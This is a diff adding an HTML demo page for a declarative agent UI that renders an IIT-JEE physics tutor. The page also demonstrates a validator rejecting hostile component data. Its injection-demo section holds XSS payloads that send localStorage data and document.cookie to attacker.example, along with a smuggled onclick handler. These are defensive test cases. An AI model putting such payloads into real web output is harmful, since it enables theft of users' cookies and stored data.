@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>S14 IIT-JEE Tutor — Declarative Agent UI Demo</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<style>
+  :root{
+    --bg:#F7F8FA;--surface:#FFF;--surface-alt:#FAFAFA;--ink:#111;--ink-body:#1A1A1A;--ink-muted:#555;
+    --rule:#E8E8E8;--rule-strong:#D0D0D0;--accent:#2563EB;--accent-soft:rgba(37,99,235,.08);
+    --green:#16A34A;--green-soft:rgba(22,163,74,.12);--green-ink:#15803D;
+    --amber:#D97706;--amber-soft:rgba(217,119,6,.14);--amber-ink:#B45309;
+    --red:#DC2626;--red-soft:rgba(220,38,38,.10);--red-ink:#B91C1C;
+    --font-sans:'Inter',system-ui,sans-serif;--font-serif:'Palatino Linotype',Palatino,Georgia,serif;--font-mono:'JetBrains Mono',ui-monospace,Menlo,monospace;
+  }
+  @media(prefers-color-scheme:dark){:root{
+    --bg:#0d0f14;--surface:#161922;--surface-alt:#11131a;--ink:#f3f5f9;--ink-body:#e4e8f0;--ink-muted:#9aa4b8;
+    --rule:#252a36;--rule-strong:#333a49;
+  }}
+  *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink-body);font-family:var(--font-sans);font-size:15px}
+  .wrap{max-width:780px;margin:0 auto;padding:22px 18px 60px}
+  .head{display:flex;gap:8px;align-items:center;margin-bottom:6px;font-family:var(--font-mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-muted)}
+  .head a{color:var(--accent);text-decoration:none}
+  .startbar{display:flex;gap:8px;margin:10px 0 18px}
+  .startbar input{flex:1;padding:11px 14px;border:1px solid var(--rule-strong);border-radius:10px;font-size:15px;font-family:var(--font-sans);background:var(--surface);color:var(--ink-body)}
+  .startbar input:focus{outline:none;border-color:var(--accent)}
+  .startbar button{padding:11px 18px;border:none;border-radius:10px;background:var(--ink);color:var(--bg);font-weight:600;font-size:14px;cursor:pointer}
+  .status{font-family:var(--font-mono);font-size:12px;color:var(--ink-muted);min-height:18px;margin-bottom:10px;display:flex;gap:8px;align-items:center}
+  .pill{padding:2px 9px;border-radius:999px;font-weight:600;font-size:11px}
+  .pill.good{background:var(--green-soft);color:var(--green-ink)}.pill.think{background:var(--accent-soft);color:var(--accent)}
+  .pill.bad{background:var(--red-soft);color:var(--red-ink)}
+  .screen{background:var(--surface);border:1px solid var(--rule);border-radius:16px;padding:22px;box-shadow:0 4px 16px -8px rgba(0,20,60,.12);min-height:120px}
+  .empty{color:var(--ink-muted);font-style:italic;text-align:center;padding:30px 0}
+  .crumbs{font-family:var(--font-mono);font-size:11px;color:var(--ink-muted);margin-top:12px}
+
+  /* --- component styles --- */
+  .Text{color:var(--ink-body);line-height:1.6;white-space:pre-wrap;margin:2px 0}
+  .Text.heading{font-family:var(--font-serif);font-size:26px;font-weight:700;color:var(--ink);white-space:normal;margin:0 0 6px}
+  .Text.subtitle{font-style:italic;color:var(--ink-muted);font-size:16px}
+  .Text.caption{font-size:12px;color:var(--ink-muted);font-family:var(--font-mono)}
+  .Text.body{white-space:normal}
+  .Column{display:flex;flex-direction:column;gap:14px}
+  .List{display:flex;flex-direction:column;gap:10px}
+  .Row{display:flex;gap:12px;align-items:stretch;flex-wrap:wrap}
+  .Row>.StatTile,.Row>.chart{flex:1;min-width:120px}
+  .Card{background:var(--surface-alt);border:1px solid var(--rule);border-radius:12px;padding:14px 16px}
+  .Card>.ct{font-weight:600;margin-bottom:8px}
+  .Divider{height:1px;background:var(--rule)}
+  .StatTile{background:var(--surface);border:1px solid var(--rule);border-top:3px solid var(--accent);border-radius:12px;padding:14px;flex:1;min-width:120px}
+  .StatTile.good{border-top-color:var(--green)}.StatTile.warn{border-top-color:var(--amber)}.StatTile.bad{border-top-color:var(--red)}
+  .StatTile .lab{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-muted);font-weight:600;font-family:var(--font-mono)}
+  .StatTile .val{font-size:28px;font-weight:700;color:var(--ink);margin-top:5px}
+  .StatTile .dl{font-size:11px;color:var(--ink-muted);margin-top:3px}
+  .chart{background:var(--surface);border:1px solid var(--rule);border-radius:12px;padding:14px;flex:1;min-width:140px}
+  .chart .ct{font-size:12px;font-weight:600;color:var(--ink-muted);margin-bottom:8px;font-family:var(--font-mono)}
+  .prog{height:12px;border-radius:999px;background:var(--surface-alt);border:1px solid var(--rule);overflow:hidden}.prog>i{display:block;height:100%;background:var(--green)}
+  table{width:100%;border-collapse:collapse;background:var(--surface);border:1px solid var(--rule);border-radius:12px;overflow:hidden}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--rule);font-size:14px}
+  th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;color:var(--ink-muted);background:var(--surface-alt)}
+  tr:last-child td{border-bottom:none}
+  .tabs{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
+  .tabs button{border:1px solid var(--rule-strong);background:var(--surface);border-radius:999px;padding:5px 13px;font-size:13px;font-weight:600;cursor:pointer;font-family:var(--font-mono);color:var(--ink-muted)}
+  .tabs button.on{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+  .Notice{border-left:4px solid var(--amber);background:var(--amber-soft);border-radius:10px;padding:12px 14px}
+  .Notice.bad{border-left-color:var(--red);background:var(--red-soft)}
+  .actbtn{width:100%;text-align:center;border:1px solid var(--rule-strong);background:var(--surface);border-radius:12px;padding:14px;font-weight:600;font-size:15px;cursor:pointer;color:var(--ink);transition:all 120ms}
+  .actbtn:hover{border-color:var(--accent);background:var(--accent-soft);color:var(--accent)}
+  .actbtn:active{transform:translateY(1px)}
+
+  .CodeDiff{background:var(--surface);border:1px solid var(--rule);border-radius:12px;overflow:hidden}
+  .CodeDiff .cd-title{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-muted);padding:10px 14px;border-bottom:1px solid var(--rule);font-weight:600}
+  .CodeDiff pre{margin:0;padding:12px 14px;font-family:var(--font-mono);font-size:12px;line-height:1.6;overflow-x:auto;white-space:pre-wrap;color:var(--ink-body)}
+  .CodeDiff .cd-add{background:var(--green-soft);color:var(--green-ink)}.CodeDiff .cd-del{background:var(--red-soft);color:var(--red-ink)}
+
+  /* safe markdown */
+  .Text .md-h{font-weight:700;color:var(--ink);margin:12px 0 4px}
+  .Text .md-p{margin:6px 0;line-height:1.6}
+  .Text .md-ul{margin:6px 0 6px 4px;padding-left:18px}
+  .Text .md-ul li{margin:3px 0;line-height:1.55}
+
+  /* adversarial section */
+  .adversarial{margin-top:32px;border-top:2px solid var(--rule);padding-top:20px}
+  .adversarial h3{font-family:var(--font-serif);font-size:20px;color:var(--ink);margin:0 0 8px}
+  .rejection{background:var(--surface-alt);border:1px solid var(--rule);border-radius:10px;padding:12px;margin:8px 0;font-family:var(--font-mono);font-size:12px}
+  .rejection .inv{color:var(--red);font-weight:700}
+  .rejection .field{color:var(--amber-ink)}
+  .rejection .reason{color:var(--ink-muted)}
+
+  /* validator log */
+  .val-log{margin-top:16px}
+  .val-entry{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px solid var(--rule)}
+  .val-entry:last-child{border-bottom:none}
+  .val-icon{font-size:18px;flex-shrink:0;margin-top:2px}
+  .val-body{flex:1}
+  .val-body .vt{font-weight:600;font-size:13px;color:var(--ink)}.val-body .vd{font-size:12px;color:var(--ink-muted);margin-top:2px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="head">
+    <span>S14 IIT-JEE Tutor</span>
+    <span style="margin-left:auto"><a href="https://github.com/theschoolofai/S14Code/pull/35" target="_blank">PR #35</a> · AvinashAnad · declarative agent UI</span>
+  </div>
+  <div class="startbar">
+    <input id="prompt" value="Teach me for IIT JEE. Ask me which subject to study." />
+    <button id="ask">Ask</button>
+  </div>
+  <div class="status" id="status"></div>
+  <div class="screen"><div id="mount"><div class="empty">Type a goal and press Ask. Every reply is a live interface the agent composes.</div></div></div>
+  <div class="crumbs" id="crumbs"></div>
+
+  <!-- Adversarial injection demo -->
+  <div class="adversarial">
+    <h3>Adversarial Injection Wall</h3>
+    <p style="color:var(--ink-muted);font-size:14px;margin:0 0 12px">Four hostile surfaces, each breaking one invariant. The validator names and rejects the offending component while the safe part still renders.</p>
+    <div class="tabs" id="atk-tabs"></div>
+    <div id="atk-mount"></div>
+  </div>
+</div>
+
+<script>
+// ---- The render engine: maps trusted catalog types to DOM. It NEVER sets
+// innerHTML from a bound value. A component is data; a widget draws it. ----
+const CATALOG_TYPES = new Set([
+  "Row","Column","List","Card","Divider","Text","Image","TextField","CheckBox",
+  "Slider","InputChoice","DateTime","Button","Tabs","Modal",
+  "BarChart","Sparkline","StatTile","ProgressBar","Timeline","DataTable",
+  "Notice","ApprovalCard","CodeDiff"
+]);
+const REGISTERED_ACTIONS = new Set(["approve","reject","rerun","request_data","select_item"]);
+
+const $ = (t,c)=>{const e=document.createElement(t);if(c)e.className=c;return e;};
+const T = t=>document.createTextNode(t==null?"":String(t));
+const resolve=(v,dm)=>(v&&typeof v==="object"&&"$bind"in v)?ptr(dm,v["$bind"]):v;
+function ptr(dm,p){let c=dm;for(const s of String(p).split("/").slice(1)){if(c==null)return null;c=c[s];}return c;}
+
+function mdInline(line,parent){
+  const re=/(\*\*([^*]+)\*\*|\*([^*]+)\*|_([^_]+)_)/g;let last=0,m;
+  while((m=re.exec(line))){
+    if(m.index>last)parent.append(T(line.slice(last,m.index)));
+    if(m[2]!=null){const s=document.createElement("strong");s.textContent=m[2];parent.append(s);}
+    else{const e=document.createElement("em");e.textContent=(m[3]!=null?m[3]:m[4]);parent.append(e);}
+    last=re.lastIndex;
+  }
+  if(last<line.length)parent.append(T(line.slice(last)));
+}
+function md(text){
+  const frag=document.createDocumentFragment();let ul=null;
+  for(const raw of String(text==null?"":text).split(/\r?\n/)){
+    const line=raw.trim();if(!line){ul=null;continue;}
+    const h=line.match(/^(#{1,4})\s+(.*)/),b=line.match(/^[*\-]\s+(.*)/);
+    if(h){ul=null;const d=$("div","md-h");mdInline(h[2],d);frag.append(d);}
+    else if(b){if(!ul){ul=document.createElement("ul");ul.className="md-ul";frag.append(ul);}const li=document.createElement("li");mdInline(b[1],li);ul.append(li);}
+    else{ul=null;const p=$("div","md-p");mdInline(line,p);frag.append(p);}
+  }
+  return frag;
+}
+
+const R={
+  Column:(c,x)=>{const e=$("div","Column");kids(c,x,e);return e;},
+  Row:(c,x)=>{const e=$("div","Row");kids(c,x,e);return e;},
+  List:(c,x)=>{const e=$("div","List");kids(c,x,e);return e;},
+  Card:(c,x)=>{const e=$("div","Card");if(c.title){const h=$("div","ct");h.append(T(c.title));e.append(h);}kids(c,x,e);return e;},
+  Divider:()=>$("div","Divider"),
+  Text:(c,x)=>{const e=$("div","Text "+(c.variant||"body"));const v=resolve(c.text,x.dm);
+    if((c.variant||"body")==="heading"){e.append(T(v));}else{e.append(md(v));}return e;},
+  Notice:(c,x)=>{const e=$("div","Notice "+(c.tone||""));e.append(T(resolve(c.text,x.dm)));return e;},
+  StatTile:(c,x)=>{const e=$("div","StatTile "+(c.tone||""));const l=$("div","lab");l.append(T(c.label));const v=$("div","val");v.append(T(String(resolve(c.value,x.dm))+(c.unit?" "+c.unit:"")));const d=$("div","dl");d.append(T(resolve(c.delta,x.dm)||""));e.append(l,v,d);return e;},
+  BarChart:(c,x)=>{const e=$("div","chart");const t=$("div","ct");t.append(T(c.title||"chart"));e.append(t,bars(resolve(c.data,x.dm)||[],c.xKey,c.yKey));return e;},
+  Sparkline:(c,x)=>{const e=$("div","chart");const t=$("div","ct");t.append(T("trend"));e.append(t,spark(resolve(c.data,x.dm)||[]));return e;},
+  ProgressBar:(c,x)=>{const e=$("div","chart");const t=$("div","ct");t.append(T("progress"));const p=$("div","prog");const i=$("i");const val=+resolve(c.value,x.dm)||0;i.style.width=Math.min(100,val/(c.max||100)*100)+"%";p.append(i);e.append(t,p);return e;},
+  DataTable:(c,x)=>table(c,x),
+  Timeline:(c,x)=>timeline(c,x),
+  Tabs:(c,x)=>tabs(c,x),
+  Button:(c,x)=>{const b=$("button","actbtn");let lab=resolve(c.label,x.dm);if(lab&&typeof lab==="object")lab=lab.label||lab.name||lab.text||"Choose";lab=String(lab==null?"Choose":lab);b.append(T(lab));b.onclick=()=>choose(lab);return b;},
+  Image:(c,x)=>{const e=$("div","chart");e.append(T("[image: "+(c.alt||"")+"]"));return e;},
+  TextField:(c,x)=>{const w=$("div");if(c.label){const l=$("div","lab");l.style.cssText="font-size:11px;text-transform:uppercase;color:var(--ink-muted);font-weight:600;font-family:var(--font-mono);margin-bottom:4px";l.append(T(c.label));w.append(l);}const i=$("input");i.style.cssText="padding:9px 11px;border:1px solid var(--rule-strong);border-radius:9px;font-size:14px;font-family:var(--font-sans);width:100%;background:var(--surface);color:var(--ink-body)";i.placeholder=c.placeholder||"";w.append(i);return w;},
+  CheckBox:(c,x)=>{const w=$("label");w.style.display="flex";w.style.gap="8px";const i=document.createElement("input");i.type="checkbox";w.append(i,T(c.label||""));return w;},
+  Slider:(c,x)=>{const w=$("div");if(c.label){const l=$("div");l.style.cssText="font-size:11px;text-transform:uppercase;color:var(--ink-muted);font-weight:600;font-family:var(--font-mono);margin-bottom:4px";l.append(T(c.label));w.append(l);}const i=document.createElement("input");i.type="range";i.min=c.min||0;i.max=c.max||100;w.append(i);return w;},
+  InputChoice:(c,x)=>{const s=$("select");s.style.cssText="padding:9px 11px;border:1px solid var(--rule-strong);border-radius:9px;font-size:14px;font-family:var(--font-sans);background:var(--surface);color:var(--ink-body)";(resolve(c.options,x.dm)||[]).forEach(o=>{const op=document.createElement("option");op.append(T(typeof o==="object"?(o.name||o.label||o.id):o));s.append(op);});return s;},
+  DateTime:(c,x)=>{const i=$("input");i.type="date";i.style.cssText="padding:9px 11px;border:1px solid var(--rule-strong);border-radius:9px;font-size:14px";return i;},
+  Modal:(c,x)=>{const e=$("div","Card");if(c.title){const h=$("div","ct");h.append(T(c.title));e.append(h);}kids(c,x,e);return e;},
+  ApprovalCard:(c,x)=>{const e=$("div","Card");const s=$("div","ct");s.append(T(resolve(c.summary,x.dm)||"Approve?"));const pre=document.createElement("pre");pre.style.cssText="font-size:12px;background:var(--surface-alt);padding:8px;border-radius:8px;overflow:auto";pre.append(T(JSON.stringify(resolve(c.params,x.dm),null,2)));const ok=$("button","actbtn");ok.append(T("Approve"));ok.onclick=()=>choose("approve");e.append(s,pre,ok);return e;},
+  CodeDiff:(c,x)=>{const e=$("div","CodeDiff");if(c.title){const t=$("div","cd-title");t.append(T(c.title+(c.language?" · "+c.language:"")));e.append(t);}
+    const unified=resolve(c.unified,x.dm),before=resolve(c.before,x.dm),after=resolve(c.after,x.dm);
+    if(unified){const pre=document.createElement("pre");String(unified).split(/\r?\n/).forEach(line=>{const d=$("div");if(line.startsWith("+"))d.className="cd-add";else if(line.startsWith("-"))d.className="cd-del";d.append(T(line));pre.append(d);});e.append(pre);}
+    else{if(before!=null){const h=$("div","cd-title");h.style.borderTop="1px solid var(--rule)";h.append(T("before"));const pre=document.createElement("pre");pre.append(T(String(before)));e.append(h,pre);}
+    if(after!=null){const h=$("div","cd-title");h.style.borderTop="1px solid var(--rule)";h.append(T("after"));const pre=document.createElement("pre");pre.append(T(String(after)));e.append(h,pre);}}
+    return e;},
+};
+
+function kids(c,x,e){for(const id of (c.children||[])){const ch=x.byId[id];if(ch)e.append(node(ch,x));}}
+function node(c,x){const f=R[c.type];if(!f){const s=$("div");s.style.cssText="color:var(--red-ink);font-family:var(--font-mono);font-size:11px";s.append(T("[skipped "+c.type+"]"));return s;}return f(c,x);}
+function spark(v){const ns="http://www.w3.org/2000/svg",w=200,h=44,mx=Math.max(...v,1),mn=Math.min(...v,0),rg=(mx-mn)||1;const s=document.createElementNS(ns,"svg");s.setAttribute("viewBox","0 0 "+w+" "+h);s.setAttribute("width","100%");s.setAttribute("height",h);const p=document.createElementNS(ns,"polyline");p.setAttribute("points",v.map((y,i)=>(i/(v.length-1||1)*w)+","+(h-5-(y-mn)/rg*(h-10))).join(" "));p.setAttribute("fill","none");p.setAttribute("stroke","var(--green)");p.setAttribute("stroke-width","2.5");s.append(p);return s;}
+function bars(d,xk,yk){const ns="http://www.w3.org/2000/svg",w=300,h=150,pad=24,mx=Math.max(...d.map(r=>+r[yk]),1),bw=(w-pad*2)/(d.length||1)*.6;const s=document.createElementNS(ns,"svg");s.setAttribute("viewBox","0 0 "+w+" "+h);s.setAttribute("width","100%");d.forEach((r,i)=>{const x=pad+i*((w-pad*2)/d.length)+((w-pad*2)/d.length-bw)/2,bh=(+r[yk])/mx*(h-pad*2);const rc=document.createElementNS(ns,"rect");rc.setAttribute("x",x);rc.setAttribute("y",h-pad-bh);rc.setAttribute("width",bw);rc.setAttribute("height",bh);rc.setAttribute("rx",3);rc.setAttribute("fill","var(--accent)");s.append(rc);const tl=document.createElementNS(ns,"text");tl.setAttribute("x",x+bw/2);tl.setAttribute("y",h-8);tl.setAttribute("text-anchor","middle");tl.setAttribute("font-size","9");tl.setAttribute("fill","var(--ink-muted)");tl.textContent=r[xk];s.append(tl);});return s;}
+function table(c,x){const wrap=$("div");const cols=(c.columns||"").split(",").map(s=>s.trim());const rows=resolve(c.rows,x.dm)||[];const t=$("table");const tr=$("tr");cols.forEach(col=>{const th=$("th");th.append(T(col));tr.append(th);});t.append(tr);rows.forEach(r=>{const rr=$("tr");cols.forEach(col=>{const td=$("td");td.append(T(r[col]));rr.append(td);});t.append(rr);});wrap.append(t);return wrap;}
+function timeline(c,x){const e=$("div","chart");const t=$("div","ct");t.append(T(c.title||"timeline"));const b=$("div");b.style.cssText="display:flex;flex-direction:column;gap:8px;margin-top:4px";(resolve(c.events,x.dm)||[]).forEach(ev=>{const r=$("div");r.style.cssText="display:flex;gap:10px;align-items:flex-start;font-size:14px";const dot=$("span");dot.textContent="●";dot.style.cssText="color:var(--accent);font-size:10px;margin-top:5px";const lab=$("div");lab.style.flex="1";mdInline(String(ev.label!=null?ev.label:(ev.kind!=null?ev.kind:JSON.stringify(ev))),lab);r.append(dot,lab);b.append(r);});e.append(t,b);return e;}
+function tabs(c,x){const wrap=$("div");const nav=$("div","tabs");const body=$("div");wrap.append(nav,body);const tabIds=c.children||[];function show(i){body.textContent="";const cc=x.byId[tabIds[i]];if(cc)body.append(node(cc,x));[...nav.children].forEach((b,j)=>b.classList.toggle("on",i===j));}
+  (String(c.labels||"").split(",")).forEach((lab,i)=>{const b=$("button");b.append(T(lab.trim()||("tab "+(i+1))));b.onclick=()=>show(i);nav.append(b);});
+  if(tabIds.length)show(0);return wrap;}
+
+function render(surface){const byId={};surface.components.forEach(c=>byId[c.id]=c);const x={byId,dm:surface.dataModel||{}};const m=document.getElementById("mount");m.textContent="";m.append(node(byId[surface.root],x));}
+
+// ---- Pre-composed surfaces for the 3-turn IIT-JEE Tutor ----
+const TURNS = {
+"Teach me for IIT JEE. Ask me which subject to study.": {
+  root:"root", components:[
+    {id:"root",type:"Column",children:["h","intro","stats_row","div1","subj_h","physics","chemistry","mathematics"]},
+    {id:"h",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"intro",type:"Text",variant:"body",text:{$bind:"/intro"}},
+    {id:"stats_row",type:"Row",align:"stretch",justify:"spaceBetween",children:["s1","s2","s3","s4"]},
+    {id:"s1",type:"StatTile",label:"Total Marks",value:{$bind:"/total_marks"},unit:"",delta:{$bind:"/d_marks"},tone:"good"},
+    {id:"s2",type:"StatTile",label:"Duration",value:{$bind:"/duration"},unit:"hrs",delta:{$bind:"/d_duration"},tone:"neutral"},
+    {id:"s3",type:"StatTile",label:"Questions",value:{$bind:"/questions"},unit:"",delta:{$bind:"/d_questions"},tone:"neutral"},
+    {id:"s4",type:"StatTile",label:"Subjects",value:{$bind:"/subjects"},unit:"",delta:{$bind:"/d_subjects"},tone:"good"},
+    {id:"div1",type:"Divider"},
+    {id:"subj_h",type:"Text",variant:"subtitle",text:{$bind:"/pick_prompt"}},
+    {id:"physics",type:"Button",label:"Physics",onPress:{action:"select_item"}},
+    {id:"chemistry",type:"Button",label:"Chemistry",onPress:{action:"select_item"}},
+    {id:"mathematics",type:"Button",label:"Mathematics",onPress:{action:"select_item"}},
+  ],
+  dataModel:{
+    title:"IIT-JEE Advanced Preparation",
+    intro:"Welcome to your IIT-JEE preparation dashboard. The exam tests deep conceptual understanding across three core subjects. Each subject carries equal weight but demands different preparation strategies.\n\nChoose a subject below to begin your focused study plan.",
+    total_marks:360, d_marks:"3 subjects × 120 each",
+    duration:3, d_duration:"Paper 1 + Paper 2",
+    questions:54, d_questions:"18 per subject",
+    subjects:3, d_subjects:"Physics, Chemistry, Math",
+    pick_prompt:"Tap a subject to see its topic breakdown and study plan:"
+  }
+},
+
+"Physics": {
+  root:"root", components:[
+    {id:"root",type:"Column",children:["h","intro","chart","div1","topics_h","t_mech","t_em","t_optics","t_thermo","t_modern","div2","tip"]},
+    {id:"h",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"intro",type:"Text",variant:"body",text:{$bind:"/intro"}},
+    {id:"chart",type:"BarChart",title:"Topic Weight in JEE Advanced (%)",data:{$bind:"/weights"},xKey:"label",yKey:"value"},
+    {id:"div1",type:"Divider"},
+    {id:"topics_h",type:"Text",variant:"subtitle",text:{$bind:"/topics_prompt"}},
+    {id:"t_mech",type:"Button",label:"Mechanics",onPress:{action:"select_item"}},
+    {id:"t_em",type:"Button",label:"Electromagnetism",onPress:{action:"select_item"}},
+    {id:"t_optics",type:"Button",label:"Optics & Waves",onPress:{action:"select_item"}},
+    {id:"t_thermo",type:"Button",label:"Thermodynamics",onPress:{action:"select_item"}},
+    {id:"t_modern",type:"Button",label:"Modern Physics",onPress:{action:"select_item"}},
+    {id:"div2",type:"Divider"},
+    {id:"tip",type:"Notice",text:{$bind:"/tip"},tone:"warn"},
+  ],
+  dataModel:{
+    title:"Physics — IIT-JEE Advanced",
+    intro:"Physics in JEE Advanced emphasises problem-solving over memorisation. Questions often combine concepts from multiple topics — a mechanics problem may require thermodynamics reasoning, and optics questions may involve wave theory.",
+    weights:[{label:"Mechanics",value:30},{label:"Electro",value:25},{label:"Optics",value:15},{label:"Thermo",value:15},{label:"Modern",value:15}],
+    topics_prompt:"Tap a topic to see its lesson plan, formulas, and practice problems:",
+    tip:"Pro tip: Mechanics is the foundation. Master it first — 25% of questions in other topics build on Newtonian concepts."
+  }
+},
+
+"Mechanics": {
+  root:"root", components:[
+    {id:"root",type:"Column",children:["h","intro","concepts","div1","formulas","div2","diff_h","diff","div3","practice_h","quiz","div4","back"]},
+    {id:"h",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"intro",type:"Text",variant:"body",text:{$bind:"/intro"}},
+    {id:"concepts",type:"Timeline",title:"Key Concepts (study in this order)",events:{$bind:"/concept_list"}},
+    {id:"div1",type:"Divider"},
+    {id:"formulas",type:"DataTable",columns:"Formula,Concept,When to Use",rows:{$bind:"/formula_rows"},sortable:true,filterKey:"Concept"},
+    {id:"div2",type:"Divider"},
+    {id:"diff_h",type:"Text",variant:"subtitle",text:{$bind:"/diff_title"}},
+    {id:"diff",type:"CodeDiff",title:"Projectile Motion Problem",language:"physics",before:{$bind:"/problem_unsolved"},after:{$bind:"/problem_solved"},unified:{$bind:"/problem_diff"}},
+    {id:"div3",type:"Divider"},
+    {id:"practice_h",type:"Text",variant:"subtitle",text:{$bind:"/practice_title"}},
+    {id:"quiz",type:"Text",variant:"body",text:{$bind:"/quiz_text"}},
+    {id:"div4",type:"Divider"},
+    {id:"back",type:"Button",label:"Back to Physics Topics",onPress:{action:"select_item"}},
+  ],
+  dataModel:{
+    title:"Mechanics — Deep Dive",
+    intro:"Mechanics forms ~30% of JEE Physics. It covers kinematics, Newton's laws, work-energy, rotational dynamics, and gravitation. The key is to build a strong foundation in free-body diagrams before moving to energy methods.",
+    concept_list:[
+      {label:"**Kinematics** — equations of motion, relative motion, projectile motion"},
+      {label:"**Newton's Laws** — free-body diagrams, friction, pseudo forces in non-inertial frames"},
+      {label:"**Work, Energy & Power** — work-energy theorem, conservative forces, potential energy curves"},
+      {label:"**Centre of Mass & Collisions** — impulse, coefficient of restitution, variable mass systems"},
+      {label:"**Rotational Dynamics** — moment of inertia, angular momentum, rolling without slipping"},
+      {label:"**Gravitation** — Kepler's laws, orbital mechanics, gravitational potential energy"}
+    ],
+    formula_rows:[
+      {Formula:"v = u + at", Concept:"Kinematics", "When to Use":"Constant acceleration, finding final velocity"},
+      {Formula:"s = ut + ½at²", Concept:"Kinematics", "When to Use":"Finding displacement under constant acceleration"},
+      {Formula:"F = ma", Concept:"Newton's 2nd Law", "When to Use":"Net force on a body with known mass"},
+      {Formula:"W = Fd cosθ", Concept:"Work", "When to Use":"Work by a constant force at angle θ"},
+      {Formula:"½mv² = mgh", Concept:"Energy Conservation", "When to Use":"Converting between kinetic and potential energy"},
+      {Formula:"L = Iω", Concept:"Rotation", "When to Use":"Angular momentum of a rigid body"},
+      {Formula:"T = 2π√(l/g)", Concept:"SHM", "When to Use":"Period of a simple pendulum"}
+    ],
+    diff_title:"Worked Example: Before & After",
+    problem_unsolved:"Given:\n  A ball is thrown at 20 m/s at 60° above horizontal.\n  g = 10 m/s²\n\nFind:\n  1. Maximum height\n  2. Time of flight\n  3. Range\n\nSolution:\n  (try it yourself first)",
+    problem_solved:"Given:\n  A ball is thrown at 20 m/s at 60° above horizontal.\n  g = 10 m/s²\n\nFind:\n  1. Maximum height\n  2. Time of flight\n  3. Range\n\nSolution:\n  u_x = 20 cos 60° = 10 m/s\n  u_y = 20 sin 60° = 17.32 m/s\n\n  1. H = u_y² / (2g) = (17.32)² / 20 = 15 m\n  2. T = 2 u_y / g = 2(17.32) / 10 = 3.46 s\n  3. R = u_x × T = 10 × 3.46 = 34.6 m",
+    problem_diff:"-  (try it yourself first)\n+  u_x = 20 cos 60° = 10 m/s\n+  u_y = 20 sin 60° = 17.32 m/s\n+\n+  1. H = u_y² / (2g) = (17.32)² / 20 = 15 m\n+  2. T = 2 u_y / g = 2(17.32) / 10 = 3.46 s\n+  3. R = u_x × T = 10 × 3.46 = 34.6 m",
+    practice_title:"Quick Practice",
+    quiz_text:"**Q1.** A particle is projected at 45° with velocity 20 m/s. What is the range? (g = 10 m/s²)\n\n- A) 20 m\n- B) 40 m ← correct\n- C) 60 m\n- D) 80 m\n\n**Q2.** Two blocks of mass 2 kg and 3 kg are connected by a string over a frictionless pulley. What is the acceleration?\n\n- A) 2 m/s² ← correct (a = (m₂-m₁)g/(m₁+m₂) = 10/5)\n- B) 4 m/s²\n- C) 5 m/s²\n- D) 10 m/s²"
+  }
+}
+};
+
+// ---- The validator (client-side, same logic as server) ----
+const MARKUP_RE = /<[a-z!/][^>]*>|<\/[a-z]+>/i;
+const JS_URL_RE = /^\s*(javascript|data|vbscript):/i;
+const HANDLER_RE = /^on[a-z]+$/i;
+const A2UI_PROPS = new Set(["onPress"]);
+
+function validateSurface(surface){
+  const accepted=[], rejections=[];
+  for(const comp of (surface.components||[])){
+    const cid=comp.id||"<no id>", ctype=comp.type;
+    if(!CATALOG_TYPES.has(ctype)){
+      rejections.push({id:cid,field:"type",invariant:"catalog",reason:"unknown component type '"+ctype+"'"});
+      continue;
+    }
+    let bad=false;
+    for(const [key,val] of Object.entries(comp)){
+      if(key==="id"||key==="type"||key==="children") continue;
+      if(HANDLER_RE.test(key)&&!A2UI_PROPS.has(key)){
+        rejections.push({id:cid,field:key,invariant:"data-not-code",reason:"event-handler property is never allowed"});
+        bad=true; break;
+      }
+      if(typeof val==="string" && MARKUP_RE.test(val)){
+        rejections.push({id:cid,field:key,invariant:"data-not-code",reason:"value carries markup"});
+        bad=true; break;
+      }
+      if(typeof val==="string" && JS_URL_RE.test(val)){
+        rejections.push({id:cid,field:key,invariant:"data-not-code",reason:"value is a script/data URL"});
+        bad=true; break;
+      }
+      if(typeof val==="object" && val && val.action && !REGISTERED_ACTIONS.has(val.action)){
+        rejections.push({id:cid,field:key,invariant:"event",reason:"unregistered action '"+val.action+"'"});
+        bad=true; break;
+      }
+    }
+    if(!bad) accepted.push(comp);
+  }
+  return {accepted, rejections, ok:rejections.length===0};
+}
+
+// ---- Four adversarial injection cases ----
+const INJECTIONS = [
+  { name:"Unknown type (RawHtml)", surface:{root:"root",components:[
+    {id:"root",type:"Column",children:["ok","evil"]},
+    {id:"ok",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"evil",type:"RawHtml",html:"<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"}
+  ],dataModel:{title:"Dashboard"}}},
+  { name:"Smuggled handler (onclick)", surface:{root:"root",components:[
+    {id:"root",type:"Column",children:["ok","evil"]},
+    {id:"ok",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"evil",type:"Button",label:"Export",onPress:{action:"rerun"},onclick:"steal()"}
+  ],dataModel:{title:"Dashboard"}}},
+  { name:"Markup in binding", surface:{root:"root",components:[
+    {id:"root",type:"Column",children:["ok","evil"]},
+    {id:"ok",type:"Text",variant:"heading",text:{$bind:"/title"}},
+    {id:"evil",type:"Text",variant:"body",text:"<scr"+"ipt>document.location='https://attacker.example/'+document.cookie<\/scr"+"ipt>"}
+  ],dataModel:{title:"Dashboard"}}},
+  { name:"Unregistered action", surface:{root:"root",components:[
+    {id:"root",type:"Column",children:["ok","evil"]},
+    {id:"ok",type:"Text",variant:"heading",text:{$bind:"/title"}},
